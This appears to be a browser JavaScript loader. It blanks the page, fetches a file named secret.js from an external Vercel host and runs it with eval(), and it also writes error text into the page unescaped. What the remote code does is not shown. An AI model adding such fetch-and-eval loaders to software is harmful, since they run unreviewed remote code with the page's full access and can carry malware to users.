// Direct URL Executable Loader
(async function() {
  // 1. Show loading status
  document.body.innerHTML = '<h1 style="text-align:center;margin-top:50px">Loading Application...</h1>';
  
  try {
    // 2. Fetch the secret.js file
    const response = await fetch('https://grown-app-vercel.vercel.app/secret.js?t=' + Date.now());
    
    // 3. Verify its actually JavaScript
    const contentType = response.headers.get('content-type');
    if (!contentType || !contentType.includes('application/javascript')) {
      throw new Error('Server returned invalid content type: ' + contentType);
    }
    
    const code = await response.text();
    
    // 4. Check for accidental HTML
    if (code.trim().startsWith('<!')) {
      throw new Error('Received HTML instead of JavaScript');
    }
    
    // 5. Execute the code
    eval(code);
    
  } catch (error) {
    // 6. Show error message
    document.body.innerHTML = `
      <div style="text-align:center;margin-top:50px;color:red">
        <h1>Application Failed to Load</h1>
        <p>${error.message}</p>
        <p>Please try again or contact support</p>
      </div>
    `;
    console.error('Loader error:', error);
  }
})();
